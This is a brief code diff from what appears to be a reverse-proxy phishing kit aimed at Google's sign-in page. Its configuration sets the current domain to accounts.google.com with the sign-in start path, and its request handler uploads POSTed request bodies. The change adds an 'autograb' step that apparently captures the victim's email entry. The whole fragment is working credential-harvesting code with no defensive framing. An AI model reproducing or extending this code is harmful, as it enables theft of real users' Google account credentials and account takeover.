@@ -170,6 +170,9 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
+
+        
         // this.req.headers['user-agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1'
         if (this.req.method === 'POST') {
             super.uploadRequestBody(clientContext.currentDomain, clientContext)
@@ -241,6 +244,8 @@ const configExport = {
     CURRENT_DOMAIN: 'accounts.google.com',
 
     START_PATH: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
+
+    AUTOGRAB_CODE: 'Email',
 
     EXTERNAL_FILTERS: 
     [
